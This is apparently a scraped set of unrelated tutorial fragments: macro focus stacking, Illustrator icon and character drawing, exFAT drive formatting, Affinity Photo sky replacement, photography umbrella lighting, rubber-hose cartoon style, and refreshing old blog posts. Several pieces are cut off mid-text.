that, depending on your lens, it can require a good amount of cropping. Some lenses change their focal length as you shift focus (focus breathing) and your final image can only be as large as the smallest image in the stack: \nOption 2: Manual focusing rail \nOne of the big advantages of using manual focusing rails is the avoidance of focus breathing. They also make it easier to execute a consistent step size. \nManual focus sliders are quite affordable, but please don\u2019t buy the cheapest one you can find on eBay\u2014the $20 models are constructed quite poorly and have very \u201cwobbly\u201d performance. Manual focus sliders are easy to bring into the field and work well enough for magnification ratios up to 5x. \nOption 3: Automated focusing rail \nThis is the most advanced option: step sizes are electronically controlled, and you\u2019re all-but-guaranteed a perfect stack. \nSuch sliders can be found as DIY Kits or as pre-assembled products, and typically start at a price point of around $200. There are also DIY instructions on the web, in case you feel crafty. A great rail that many macro photographers recommend is the Wemacro focusing slider . \nOption 4: Automated stacking in-camera \nSome cameras come with an internal focus stacking function, which allows you to define the start and end point of your stack, and the number of images you want it to take. Many Olympus cameras have this feature and most Canon DSLRs can obtain it by installing the third party Magic Lantern firmware (at your own risk). \nIn-camera focus stacking is a brilliant feature, as it allows to precisely control the step size between frames and doesn\u2019t require any additional equipment. Unfortunately, this only works for electronically controlled lenses. \nOption 5: The Helicon Tube \nThe Helicon Tube is a specialized extension tube that enables your camera to perform automated and software-controlled stacks. Conveniently, it\u2019s brought to you by Helicon , one of the leading focus stacking software producers in the industry. \nThis is an ideal solution, that unfortunately only works for electronically controlled lenses. \nOption 6: Handheld stacking \nHandheld focus stacking is another way to create stacks without additional equipment. It takes a fair bit of practice and post-production, but it rewards you with a maximum of flexibility and images you wouldn\u2019t be able to take otherwise. \nUnlike all of the other methods mentioned above, this one does not require a tripod, which makes it ideal for insects that won\u2019t stand still for long. This candy striped leaf-hopper is a good example; compare the images before and after focus stacking the scene: \nThese are a lot of different techniques to choose from, and which one is the right for you really boils down to what you are photographing and your personal preference. \nBefore You Start Stacking \nBefore you take a focus stack, please read over this checklist for best results: \nMake sure your batteries are charged and you\u2019ve got enough space on your memory card. \nCompose your shot whilst focus on the very end of the zone you\u2019d like to stack. Your final image will only be as large as the image focused the furthest away from the camera. \nUse live-view at full zoom. If you\u2019re using a camera that doesn\u2019t have live-view, start stacking before the zone of focus and finish beyond it. It is easy to get tricked by the viewfinder, and if you miss just one shot, the entire stack might be useless. \nUse a self-timer or, even better, a remote control/intervalometer to avoid camera shake. \nUse the sensor-cleaning function of your camera to avoid dirt specs in your photos. Automated focus stacking typically renders all of these into the final image. \nAfter You Completed Your Stack \nOnce you have all the images you need, it is time to stack them together. If your camera doesn\u2019t support in-camera stacking you will have to use a computer for this task. \nThere is a variety of specialized software available. Helicon Focus and Zerene are two of the most popular tools, and both work very well. Both are great pieces of software, particularly Helicon software used alongside the Helicon Tube, because they make automated focus stacking easy. \nNevertheless, I personally prefer Photoshop . It has a great built-in stacking function and countless other tools that allow more control and fine tuning. Especially for handheld focus stacking, PS is the ideal application.

      "text": "Welcome back to another Illustrator based tutorial, in which we\u2019re going to learn how to create a simple cast icon, using nothing more than some basic geometric shapes that we\u2019re going to adjust here and there. \nSo, assuming you already have the software up and running, let\u2019s jump straight into it! \nTutorial Details: Cast Icon \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 25 Minutes \nFinal Image: Cast Icon \nStep 1 \nAs with any new project, we\u2019re going to kick things off by setting up a New Document , by heading over to File > New (or by using the Control-N keyboard shortcut), which we will then adjust as follows: \nNumber of Artboards: 1 \nWidth: 96 px \nHeight: 96 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nOnce we\u2019ve set up our project file, we can start working on the actual cast icon by creating its background using an 88 x 88 px circle, which we will color using #2979FF and then position to the center of the underlying Artboard using the Align panel\u2019s Horizontal and Vertical Align Center options. \nStep 3 \nAdd the main shape for the cast symbol using a 36 x 28 px rounded rectangle with a 4 px Corner Radius and a 4 px thick Stroke ( #FFFFFF ), which we will position to the center of the larger circle. \nStep 4 \nCreate a 4 x 4 px circle, which for now we will color using a brighter color to be able to distinguish it from the larger shape, and then align to the rounded rectangle\u2019s bottom-left corner. \nStep 5 \nOnce you have the smaller circle in place, add two larger ones using a 16 x 16 px circle with a 4 px thick Stroke , followed by another 32 x 32 px one, which we will center align to the smaller one. \nStep 6 \nOpen up the paths of the two larger circles, by selecting their left and bottom anchor points using the Direct Selection Tool ( A ), and then immediately removing them by pressing Delete , making sure to set their Cap to Round afterwards from within the Stroke panel. \nStep 7 \nAdjust the shape of the cast symbol\u2019s main body, by selecting the Add Anchor Point Tool ( + ), and then adding a new anchor to its bottom path, positioning it at a distance of 6 px from the larger circle segment. \nStep 8 \nOpen up the path of the shape that we\u2019ve just adjusted, by selecting its bottom-left anchor points using the Direct Selection Tool ( A ), and then immediately removing them by pressing Delete , making sure to set the resulting Stroke \u2019s Cap to Round . \nStep 9 \nFinish off the cast icon and with it the project itself, by simply changing the color of the radio signal\u2019s composing shapes to white ( #FFFFFF ), making sure to select and group all of the cast icon\u2019s composing shapes using the Control-G keyboard shortcut, doing the same for the entire cast icon afterwards. \nAwesome Work! \nAs always, I hope you had fun working on the project and most importantly managed to learn something new and useful during the process. \nThat being said, if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nThe post How to Create a Cast Icon In Adobe Illustrator appeared first on Vectips .",

      "title": "How to Format External Hard Drive to Use on Mac and PC",
      "text": "You can format the external hard drive or USB drive to make it compatible with both Mac and Windows machines. This thing is still unknown for many users but doesn\u2019t worry it\u2019s not complex. \nIf you are techy and use Windows and Mac computers frequently, then you might need to transfer data between Mac and PC. Windows and macOS filesystems are different and you might need to format the drive every time to use on both platforms. You don\u2019t need to format the hard drive every time you can choose a filesystem while formating the drive so the hard drive or USB drive work on both Mac and PC \nSo to get rid of these situations we bring here a guide that will help you to format your drive which works on both platforms and you don\u2019t need to format and backup data every time. After cross-compatible formatting, simply unplug the drive from one machine and then plug it to another. Sounds good to you right? So let\u2019s started, how this works. \nUnderstand file systems for Mac and PC \nThere are three common file system types to format an external USB or hard drive, SSD drive, SD card and etc. FAT32, NTFS, and exFAT, let\u2019s have a look what\u2019s the difference between these formats. \nAdvertisement \nFAT 32 Format \nThis format is pretty old but supported and it\u2019s not efficient as compared to NTFS. It doesn\u2019t support big features but offers great compatibility which means it\u2019s compatible with all versions of Windows. It can only support 4GB file size and up to 8TB hard drivers. It\u2019s not capable to store files larger than 4GB. \nNTFS Format \nNTFS is a modern format system and Windows also uses this format for itself and for other non-removable drives by default. This format is also compatible with all versions of Windows but limited to none Windows OS as FAT32. \nexFAT Format \nexFAT drives are faster at reading and writing as compared to FAT32. This format can store large files and it\u2019s also lightweight. It\u2019s compatible with all versions of Windows and the best thing it\u2019s along with Windows it\u2019s also compatible with macOS , Linux, and Android, etc. \nIf your drive is formatted as Windows default format NTFS then its only readable to macOS. You can\u2019t do more than that or you have to install a separate app on Mac to read write the drive. \nDrive with macOS format HFS+ cant readable to Windows. \nFAT32 format works on both Windows and Mac but the problem is you can only work with the files with Maximum size 4GB. \nFAT32 is much better than NTFS and HFS+ coz it works on both operating systems. You can also install drivers on each OS to make work your drive. So exFAT is much better than all of these formats and a simple option but this will not work on Leopard. \nFormat and external hard drive on Mac \nFirst, let\u2019s see how to format an external hard drive or USB drive in macOS which works with both Mac and PC platforms, first plug-in your drive in macOS machine. \nOpen Disk Utility on your macOS, press cmd + spacebar keys and type Disk Utility in the spotlight search. Open Disk Utility from the search results. \nOn the Disk Utility interface, select an external drive click on the Erase button from top of the window (make sure and bcakup your drive before erasing it). \nNow enter the name for the external drive which will be used after formatting and also select exFAT for Format option and click on the Erase. This will format the drive as ExFAT format and your drive is now compatible with both platforms. \nFormat hard drive in Windows \nThe below steps for formatting external drive is for Windows 10 and also works the same with an old version of Windows. To format your external drive hard drive in Windows which works with both platforms, first plug-in your drive with Windows machine. \nOpen Disk Management tool by right-clicking on start menu icon and then select Disk Management. Now right click on the external drive and click on format option (double-check the drive name and capacity to make sure you are going to format the right drive.) \nNow enter the Volume label as you need and change the File system for exFat and click Ok. Now you are done. \nShare your experience, how do you use an external hard drive on both Mac and PC. Did you format the drive as exFAT ? or use any utility that helps the system to read another type of file system. Please leave a comment below.",

      "title": "How to Replace the Sky in a Photo in Affinity Photo",
      "text": "Mother Nature can create stunning environments, placed on the most ideal of backdrops. But let's face it, a lot of the time we end up stuck with a gorgeous landscape right below a bland blue or gray sky. \nWhat do we say to the drab skies of nature? Not today! In this Affinity Photo tutorial, we are going to be learning all about how to replace skies, and we'll look at just how much changing out a sky can affect the overall mood of a photo. \nI will be covering all the basics of replacing a sky in Affinity Photo, whether you want to add some clouds, incorporate color, or do a full-blown background swap. \nFollow along with us over on the Envato Tuts+ YouTube Channel : \nWhat You'll Need \nTo complete this project, we are using the following resources: \nGirl On Beach \nStrange Stormy Clouds \nBeautiful landscape of Lanzarote Island \nSky background \nDeath Valley, USA \nMilky Way Galaxy \nFind more resources on Envato Elements ! \n1. How to Add Clouds to a Sky \nFirst, let's look at the quickest way to change out a sky, which is to add clouds! This method will work best for shots where the sky is just a little too flat and could use some detail. In this example, we will be adding a bit of a twist to our clouds. But the technique is the same, whether you want a cloudy blue sky photo effect or a straight-up twister. \nStep 1 \nStart by dragging and dropping the Strange Stormy Sky stock image onto the canvas, over our original beach image. Crop the image to add a bit more room for the cloudy sky. \nStep 2 \nMake sure the horizon line of each photo matches up reasonably closely. You can temporarily bring down the Opacity of the storm clouds if needed to line everything up. \nStep 3 \nNext, add a Layer Mask to the storm clouds. Then, with a large, soft, round Brush , mask out the bottom half of the cloud image. \nAs both photos have a grey hue to them, they will blend beautifully with each other. With this method, I suggest choosing a sky that is similar in tone to the original image if you'd like to save some time on blending. \nStep 4 \nFinish blending the two images by adjusting the color, brightness, and contrast of both the clouds and the original image if needed. \nHere, I darkened and upped the contrast of both the base image and clouds using a Brightness/Contrast layer, while also desaturating the base image using a black and white gradient map adjustment layer. \nI then committed to the \"storm of the century\" vibe by adding both green and blue hues to the image with a Color Balance and S curve Curves layer. \nBrightness/Contrast Settings \nBrightness: -38% \nContrast: 19% \nGradient Map Settings \nBlack to White \nOpacity: 47% \nColor Balance Settings \nRed: -33% \nGreen: 51% \nBlue: 59% \nCurves Settings \n2. How to Create a Sunset Photo Effect \nNext, I am going to amp it up a notch by creating a substantially more dynamic sky mixed with a reflective surface. \nStep 1 \nFirst, let's crop our beach image to increase the sky, and I'll opt for less land, so we have an equal mix of sky, water, and earth. \nStep 2 \nNow, I am going to drop in my sky replacement. Once again, just like in the previous image, line up the horizons! \nStep 3 \nAdd a Layer Mask just as we did with the last sky, only this time we are going to be a bit more precise with our masking. \nI am still going to use a soft brush, but it's much smaller. I am blending the horizon line almost seamlessly with the new sky. \nStep 4 \nDuplicate the sky image, delete the layer mask, and set the layer to Overlay. Bring down the layer Opacity to 50%. \nNext, add a new L ayer Mask to the sky, masking out all but the top quarter of the water. \nStep 5 \nNow, repeat that same step, only this time setting the layer to Soft Light. \nAgain, delete and then add a new L ayer Mask to the duplicated sky. Mask out any area of the sky that is touching the land or the frothy white parts of the water. \nStep 6 \nLet's finish this beautiful beach day off by bringing the stark blue of the sky into both the water and land using a Color Balance layer. \nColor Balance Settings \nRed: -16% \nBlue: 53% \n3. How to Extract a Mountain Range \nWhen quick blending and layer mode magic won't do the trick on their own, you may have to remove one sky altogether to place the other. Compositing is also the ideal solution if you are going for something more stylistic, surreal, or fantasy inspired! \nStep 1 \nAs with the last image, we want there to be a bit more sky than before, so crop the canvas to give us more vertical space. \nStep 2 \nNow, let's extract the sky of the original image. The best results would come from masking out the sky by hand using just a simple Brush and Layer Mask combo. However, use your preferred method for extraction! For a quick extract job, I like to rely on the Refine Mask tool . \nUse the Flood Select Tool to create a quick selection and mask of the sky. \nStep 3 \nThen, clicking on the mask, Right Click > Refine Mask to refine and smooth the mask out. \nStep 4 \nYou can use the Select > Grow/Shrink function to get rid of any pesky unwanted edges as well, if needed. Set the Radius to -1 px and then mask out the selection. \nThis is an excellent method to use when your image will be more of a backdrop, as opposed to the main focus, or you need to mock something up quickly. Otherwise, zoom in real close and mask that bad boy out by hand! \nGo ahead and place the new sky behind the mountain range for now as well. \n4. How to Create Sunrise Lighting Effects \nNext up, let's lay down our highlights. You will likely do the bulk of your highlights on layers set to Screen, but you can also play with other layer modes like color dodge, soft light, or overlay. The Curves layer is also a great tool to use for creating or enhancing highlights! \nStep 1 \nCreate a new layer, set to Screen, and paint some ambient light focused on the horizon line. \nKeep the brush very large with a low Flow rate so you can build up the color slowly. Color pick a color from the new sky\u2014in my case, pale yellow and orange colors. \nStep 2 \nRepeat this step on a layer clipped inside your landscape to help connect and blend the two images. \nThe lighting on this layer will be more focused if you have a rising sun or any bright light source as I do. \nStep 3 \nRepeat the above step behind the mountainscape as well. \nEvery landscape will be different, and every sky a different time of day! If you are unsure how you should paint in your lighting, look up some references of a similar environment to get a better idea! \n5. How to Create Shadow Effects \nFor shadows, I recommend the use of layers set to Multiply, Soft Light, and the use of Brightness/Contrast and Curves adjustment layers. \nStep 1 \nLet's start with a Brightness/Contrast adjustment layer clipped into the mountains to darken everything and lower their contrast, as shaded areas will usually have less contrast than lit areas. \nBrightness/Contrast Settings \nBrightness: -84% \nContrast: -42% \nStep 2 \nNext, go in and mask out all the areas where the light source would be hitting. \nUse the original lighting to guide you\u2014and keep in mind that you may be able to skip this step if the light in your image is not as intense as it is in this particular image! \nStep 3 \nYou can also paint in shadows using just a brush on a layer set to Multiply. I like to set the layer Opacity to 50% , but it depends on how deep you want your shadows to be. \nWhen painting shadows, avoid using black as shadows are hardly ever flat black. Instead, use a darker, desaturated version of the color you are painting on. For instance, I could use dark brown on these mountains. \nBlue is also an excellent color to choose in this particular scene. Blue and orange are contrast colors, so they pair very well together. \nStep 4 \nNow, one of my best friends when it comes to compositing landscapes is the layer Blend Options. \nHere you can tell a layer how much it should show up on light or dark areas. I don't want these shadows to cover and darken the highlights of the image beneath, so I can drag the point on the right-hand curve to control the range of light. \nThe further I pull, the less it will show on the lighter areas of the image beneath. You can further refine this by adding more points to the curve and adjusting them. \nYou can also use this tool to pinpoint highlights or color. It's a tool best learned by just playing with it and seeing what it can do! \n6. How to Create a Sunset Color Grade \nFinally, it always helps to add a few adjustment layers over top everything to tie it all together. \nStep 1 \nFirst, let's add an S curve for some added contrast, along with bringing up the blues and reds in the shadows. \nCurves Settings \nStep 2 \nNext, create a masked Color Balance adjustment layer adding blue to the outer edges of the image and one to bring more oranges into the innermost area of the image. \nColor Balance Settings \nRed: -25% \nGreen: -20% \nBlue: 22% \nStep 3 \nFinally, create a second masked Color Balance adjustment layer, bringing more yellows and reds into the innermost area of the image. \nColor Balance Settings \nRed: 23% \nGreen: -28% \nBlue: -77% \nAnd There You Have It! \nWhile sometimes adding in a few fluffy white clouds will do just the trick, don't be afraid to try changing up the whole mood of a photo by switching from a bright blue sky to a set of ominous clouds rolling in. Or create an entirely new alien atmosphere full of stars and planets. Every photo has a story to tell, and you can change the whole narrative just by choosing one sky over another! The sky is not the limit after all! \nSo, as always, keep experimenting with different techniques and practicing, and don't forget to post your version below, along with any questions, comments, or critiques! \nLooking to learn more?

      "text": "This time we\u2019ll be creating a cute cartoon Back to School character ! Let\u2019s use the Pencil Tool and other handy tools of Adobe Illustrator to draw a funny raccoon wearing glasses. This character can be used for making stickers, patterns and designs for stencil and fabric. Let\u2019s do it! \nTutorial Details \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Pencil Tool, Stroke Panel, Pathfinder panel, Paintbrush Tool \nEstimated Completion Time: 20 minutes \nFinal Image: Back to School Character \nStep 1 \nLet\u2019s take the Pencil Tool (N) and draw half of the raccoon\u2019s head. I\u2019ve set the Fidelity of my pencil to Smooth (you can open the Options window by double-clicking the tool icon) and I\u2019m using the Direct Selection Tool (A) to fix the position of the anchor points and handles to give the shape a desired silhouette. \nStep 2 \nNow let\u2019s keep our shape selected and double-click the Reflect Tool (O) . Set the Axis to Vertical and click Copy to mirror the shape to the other side. Move the shape to its place and Unite both halves of the head in the Pathfinder panel. \nStep 3 \nTake the Pencil Tool (N) and set the Fill color to None, Stroke color to grey in the Color panel. \nDraw half of the shape, as shown in the image below. Then use the Reflect Tool (O) to create a mirrored copy. Use the Direct Selection Tool (A) to select two points that overlap, right mouse click and select Join , this way turning two pieces into one single curve. \nStep 4 \nSelect the head of the school character and Duplicate (Control-C > Control-F) it. Then select the top copy and the created curve and click Divide in the Pathfinder panel to cut the head into two pieces. Recolor the bottom part of the head, filling it with beige color. \nStep 5 \nDraw another shape with the Pencil Tool (N) and fill it with dark-blue color. Use the Reflect Tool (O) and the Unite function in the Pathfinder panel to flip and merge the shape. \nMove the shape under the blue shape, as shown in the image below. \nStep 6 \nI\u2019m using the Direct Selection Tool (A) to select the sharp corners of the muzzle area of the school character and pull the circle markers of the Live Corners , making the shape rounded. \nStep 7 \nNow we\u2019ll use the Ellipse Tool (L) to create an oval for the nose and the Paintbrush Tool (B) to draw an arched line for the mouth. \nWe can adjust the curve settings in the control panel on top, setting the Stroke weight to 4 pt, Variable Width Profile to Width Profile 1. This way we make the mouth shape more expressive and the corners of the mouth sharp. \nStep 8 \nLet\u2019s add the eyes using the Ellipse Tool (L) . Hold down Shift and create a small (about 8 x 8 px ) circle filled with dark color. \nAdd a smaller circle on top for the highlight. \nStep 9 \nNow we\u2019ll create an ear using the Polygon T ool which is located in the same drop-down menu as the Rectangle Tool (M). \nDouble-click the Polygon Tool icon and set the Sides value to 3 . Scale and rotate the created triangle to make it fit the school character\u2019s head. \nStep 10 \nLet\u2019s bend the ear of the school character slightly. Go to Effect > Warp > Arc, set the Vertical Bend value to -15% and click OK. \nObject > Expand Appearance to apply the effect. \nDuplicate (Control-C > Control-F) the shape, make it smaller and change the color to beige, depicting the inner part of the ear. \nStep 11 \nLet\u2019s duplicate the inner shape of the ear and change the color of the copy to a darker beige. \nNow take the Eraser Tool (Shift-E), set its size to some small value ( double-click to open the Options ) and make a few strokes, erasing several parts of the top shape to make it look striped. \nStep 12 \nNow we\u2019ll add some more details to the muzzle. Take the Paintbrush Tool (B) , set the Stroke color to light-blue and start drawing separate hairs on the nose-bridge, moving up to the forehead. \nStep 13 \nLet\u2019s add some Back to School accessories to our cute raccoon mascot. \nTake the Ellipse Tool (L) , hold down Shift and make a large circle for the rim of the glasses. Set the Fill color to None and the Stroke color to bright-orange. \nCopy (Control-C) the circle and Paste in Back (Control-B). Change the Fill color of the bottom copy to orange and the Stroke color to None . Set the Opacity to about 30% in the Transparency panel, making the glass semi-transparent. \nDuplicate (Control-C > Control-F) the semi-transparent shape once again and use the Eraser Tool (Shift-E) to erase some of its parts, creating a highlight on the glass surface. \nStep 14 \nGroup (Control-G) all the elements of the glass, hold down Alt-Shift and drag to the right, creating a copy of the group. This time we\u2019re not using the Reflect Tool (O) because we want the highlights to be tilted in the same direction. \nUse the Pencil Tool (N) to draw a central part of the rim, connecting the circles. \nStep 15 \nNow that the school character is ready, we can add a bright background, use a cute Peralta font to add some text and have fun with the Paintbrush Tool (B) to scribble some lines and circles as we do it in school! \nYay! Our Back to School Character Mascot is Finished! \nThat\u2019s all folks! I hope you guys enjoyed this lesson and found some new tips and tricks that will be useful for your future projects! \nHappy designing! \nThe post How to Draw a Back to School Character in Adobe Illustrator appeared first on Vectips .",

      "title": "Why Umbrellas Don\u2019t Suck (But Your Lighting Might)",
      "text": "I\u2019m photographer Jay P Morgan of The Slanted Lens , and today I\u2019m going to talk about umbrellas! \nPeople have forgotten about umbrellas, they don\u2019t use umbrellas, but umbrellas are a gorgeous way to light. So let\u2019s take a look at them \u2014 see how to use them, set them up, and see the different qualities of light with different umbrellas. \nThe model helping us with these demonstrations is Regan Savanna . \nPros \n#1. Beautiful Light Quality \nIf you shoot a light through an umbrella, you get a gorgeous soft light, especially through a large umbrella. \n#2. Inexpensive! \nIf you have a bunch of lights on camera and you need a light to bounce into the background, light to go into the ceiling and several things in the same setup, it\u2019s inexpensive to get several setups to make that happen. \n#3. Mounts Built in to Most Lights \nAbout every light has a place to put an umbrella so you can put it on your strobe or hot light and just start to shoot. You don\u2019t need that extra piece of equipment! \n#4. Small Size \nThey are super compact and easy to roll up and just throw in a bag. \nCons \n#1. Broad Light Pattern \nThey throw light everywhere! It\u2019s hard to control the light as it just bounces and goes everywhere. So you have to know how to use them and you can use them correctly and control your light. \n#2. No Grid \nAnother part of that problem with not being able to control them, you can put a grid on it. With a softbox you can narrow the light, but with an umbrella you can\u2019t have control like that. \n#3. Need Reflectors & Bounce Boards \nIt\u2019s difficult to narrow the angles and direct the light. \nBut I\u2019m going to show you a way to use it that does work and creates a great soft beautiful light. \nI want to set up a portrait so you can see how beautiful you can make this light look. But before we get to that I was to look at the different sizes, silver vs shoot-through, and look at that quality of light on Regan\u2019s face comparing side by side. \nBefore we shoot our first test, it\u2019s really important to know how to set am umbrella up. Some people just throw the umbrella up and walk away and they don\u2019t think about this area of coverage here, which is co critical for how this is going to function. \nThis light is very close to the umbrella, which is making the source very hard. It\u2019s just using this small part of the umbrella! \nIf I pull this out, I allow this to open up and to fill all of that umbrella area and it\u2019s going to become a softer light. We utilize the entire umbrella when I do that. \nWhen I go too far though, it starts to spill out of the umbrella, and I\u2019m losing a lot of my light into the room. So I want to find the point where I keep it contained inside the umbrella but it\u2019s still giving us a soft light. But if you want a hard look, just punch in. \n30-inch White Interior \nSo our first umbrella is a 30-inch, white interior. It should give us a pretty soft light, but it\u2019s a little directional because of that soft interior. \n30-inch Silver Interior \nThat silver interior is much more directional, and just look at the background compared to the white! \n40-inch Satin Interior \nIt\u2019s already starting to transition nicer between the highlights and the shadows, and that\u2019s how you can tell if a light is soft or hard. \n40-inch Silver Interior \nWe gained a stop with the silver interior and it\u2019s more directional and we really lost the light in the background. These two 40-inch umbrellas are very different looking, all because of the material. \n70-inch Silver Interior \nIt\u2019s a really beautiful light and it still stays pretty confined. It\u2019s on her face, it\u2019s not on the background very much, we do gain that 1 stop, but because of the size of it it\u2019s starting to wrap around her face more than the 40-inch and you see that light coming into the shadow area \u2013 still a very directional light. \nI don\u2019t have a white 70-inch, but now we\u2019re going to move to shooting through umbrellas. \n30-inch Shoot Thru \nIt combines a quality of the silver bounce and the white bounce because it\u2019s got the directionality of the silver bounce but it\u2019s also got a more open light, but it has a background more like the white bounce, so it\u2019s really interesting, but it does give us that 1 stop more of exposure. \n40-inch Shoot Thru \nAgain it combines the same qualities. It\u2019s got the harshness and directionality of the silver, but it\u2019s got a throw that lights the background like the white bounce did. \n70-inch Shoot Thru \nThis again has got the same combination of qualities. I like the light on her face because it\u2019s this beautiful transition. The light\u2019s back far enough that it\u2019s transitioning \u2013 I still have some shadow so it looks really nice on her face but it\u2019s just a softer transition just because of the size. \nThe smaller the source, the harder the light source becomes. \nTake a look at the 70-inch shoot-through vs the bounce! I think the shoot-through is much softer. \nThere\u2019s a look at the 30-, 40- and 70-inch umbrellas with the different interiors and shoot-through. Which do you like the most? \nNow I\u2019m going to do a quick portrait here and set up with the large shoot-through because I love the look of that one. I\u2019m going to take the umbrella and I\u2019m going to move it around and I\u2019m going to aim it back towards the camera a little bit. \nSo there\u2019s that 70-inch shoot-through just slightly behind her, I love that look. You can see the beautiful transition to the front. \nIf the stick in the middle of the umbrella was longer, I could push this furthers and I could fill the umbrella with more light. \nI\u2019m going to try something here where I have someone hold the light and umbrella and go back. \nWow! The light is so much softer when you move the umbrella back because it fills the whole umbrella and becomes a much softer source. The problem is it becomes much more out of control, the background becomes much brighter and so I like what we had originally because it was a little more directional and it was a soft light on her face, but it wasn\u2019t all over the background as well. \nSo there you have it: a look at umbrellas. Don\u2019t discredit them because everyone is using softboxes. They really have a great place in your lighting kit. \nKeep those cameras rolling and keep on clicking. \nAbout the author : Jay P.

      "text": "The art style of early cartoons from the 1920s-1930s era is known as \u201cRubber Hose\u201d. It refers to the bendy limbs of cartoon characters from Disney and Fleischer Studios, such as Felix the Cat, Betty Boop and early Mickey Mouse (or Steamboat Willie) and their associated antagonists. Other characteristics that give the cartoons of the silent era their distinctive look include black bodies with white faces, pie-shaped eyes, and four-fingered hands in white gloves.

Why Should I Update My Old Content? \nYou might be thinking here \u2014 \u201cBut, my content is already perfect and I\u2019ve had a ton of views. Why should I change it?\u201d \nThe truth is, if you\u2019re not updating your old blogs, you are missing out on potential new readers, heightened traffic, and reducing the chance that your old ones will return. \nReturning to those killer posts you\u2019ve already spent time and money on is an essential part of improving the ROI and the quality of your site. \nAccording to Hubspot , blogs are now the 5th most trusted source for online information. By staying up to date on the latest information and revamping your old content, readers know they can count on you to keep them in the loop. \nAnd, by keeping your readers up to date and engaged, it lets Google\u2019s crawlers know that you\u2019re still super hip and worthy of a high ranking. Win-Win! \nBut what about your old readers? Trust me, they will thank you for being a reliable resource for the latest and greatest content. \nBesides, you\u2019ve already invested the time and effort to create them, why not make them all that they can be? \nSource: Andrea La-Rosa \nThink of it this way\u2026 \nYou know that super sweet hairstyle you\u2019ve rocked for years, the incredible bangs or maybe those stylish bleach blonde tips? They were super fly once. \nBut today? They may not be quite on trend anymore. \nBlog posts are a similar situation. You can still love them, but times have changed and so has the information online. \nIt\u2019s likely that, no matter the topic, there exists new and potentially better information about that subject you so diligently researched. \nSo, stay on trend! Schedule in the time for researching and updating, and see what else has surfaced since you posted. \nBlogs are now the 5th most trusted source, according to @HubSpot. One way to keep your old posts alive and kicking today and in the future is to simply clean and update them. \ud83e\uddf9 Here's how you can do this. \nClick To Tweet \n2. Digging for Gold: How to Audit Your Content \nOkay, I\u2019ve convinced you. You\u2019ve decided to refresh your old blog posts. \nBut should you start now and if not, when? \nEveryone asks me this question! The answer is if you have 2 or more years of content, and you haven\u2019t updated them, you are missing out on valuable leads that could become conversions. \nMake it a priority to schedule time to update your blogs every quarter. I recommend updating at least 5-10 of them for optimal results. \nThis can result in some serious ROI if you make the commitment to updating the content you\u2019ve published. \nAlright, you\u2019ve decided the time is now. Have you got your editing pickaxe in hand? Let\u2019s take a look at your previous masterpieces. \nA great place to begin is Google Analytics. \nThere you can find metrics like bounce rate, social shares, and time-on-page. These will help you determine which previous posts are the best performing. \nThink of Google Analytics as a stick of dynamite instead of a pickaxe. \ud83e\udde8 \nTo start, open your Google Analytics account . On the left-hand side, go to Behavior. \nThen, click the Overview button. Next, navigate to the bottom right of the page and click view full report in the bottom right-hand corner. \nOn the next screen, there will only be 10 posts by default. You can change this by going to the bottom of the page and editing the Show rows option to any number you like: 100, or even 5,000. \nThen, return to the top of the page and click Export. \nBoom! You now have a perfectly organized list of your posts. \nFrom here, look closely to determine which posts have the highest conversion rates, the largest amount of traffic, and the lowest bounce rate. \nThese are your golden nuggets that keep visitors engaged. \nBut what if you don\u2019t use Google Analytics or what if your posts have similar stats? Not a problem, there are other ways to determine which posts you should focus on. \nOne way is deciding which content is evergreen. \nEvergreen content is content that will provide unique value for your visitors, generate traffic, and result in conversions for the foreseeable future. \nIf you\u2019re unsure what falls into that category, think about the pieces that took you some time to craft. Examples include how-to guides, frequently asked question posts, and resource lists. While you may love that super in-depth post about Blu-ray collecting, it may not be the best choice. \nReady to go deeper? Let\u2019s keep digging. \nHow do you know which old content needs some makeover? Here's a quick and easy tip to get right into it with the help of Google Analytics. \nClick To Tweet \n3. So You\u2019ve Found Your Gold, Now What? \nAfter the sifting and searching, you now have a handful of great posts ready to be updated. \nAnd, wow! What a treasure trove you\u2019ve discovered. \nAlthough the hard work may seem like it\u2019s over, don\u2019t stop there. It\u2019s time to refine your posts into something even better. \nTo begin, choose the first blog to update and read it carefully. \nDo you still love it? Are any of the facts outdated? \nDid you cringe at any of your wording? \nAre there any typos? \nIf so, start the process by fixing those small imperfections. These minor changes can mean the difference between conversions and a high bounce rate. \nAlso, keep in mind that your writing style may have changed over time. Try to edit the piece so that it reflects your current style. \nAnd as you read, don\u2019t forget to take formatting into consideration. \nIf your blog was a bit clunky or if there were a few too many large blocks of text that don\u2019t exactly scream \u201cRead me!\u201d, think about breaking those sections up. \nBy creating easier-to-digest sections, it will pull your reader through your piece and encourage them to keep reading. \nIf you\u2019re unsure about how to do that, head on over to our 6 simple tips for writing clear sentences article for more ways to get the most out of your blog\u2019s structure. \nOnce you\u2019ve accomplished the basics, it\u2019s time to dig even deeper. \nWhat else should you check in your old blog post before hitting update? Make sure to look for typos, format errors, outdated stats, broken links, and see to it that the piece reflects your current writing style. \nClick To Tweet \nThe 4-Step Checklist for Updating Older Content (Correctly) \n1. Check for Broken Links & Outdated Research \nA few issues that can happen with older blog posts: You might be linking to content that no longer exists, or the topic and discussion may not be as relevant as when you originally posted. This can increase your bounce rate and citing outdated research can significantly hurt your position as an \u201cexpert\u201d in the field. \nTo see if this is the case for your piece, try checking for broken links by using tools like this free broken link checker. \nIf you find any links that lead you to a 404 page or to outdated posts, update them with the relevant content or simply remove them. \nThis lets Google know you\u2019re on top of it and makes it more likely that your content will rank higher. \nIf your links are still as bright and shiny as when you first posted, consider adding new external ones. \nCan you find new research that wasn\u2019t available before? If so, linking to those articles can boost your credibility and increase your viewership. \nBetter than adding external links is adding internal links to your content. You likely wrote another article that relates and can help provide additional resources. Add that link in! It just might be the information your readers were looking for. \nI know when I\u2019m reading a piece that has already grabbed my attention I almost always click on their links to check out what other gems they have waiting for me. By adding internal links, you not only encourage your readers to remain on your site but it also increases the likelihood that they will share your work. \nFirst thing to check on that old blog post? All those links! You'll want your post to be clear of links leading to 404s and outdated pages. Read more 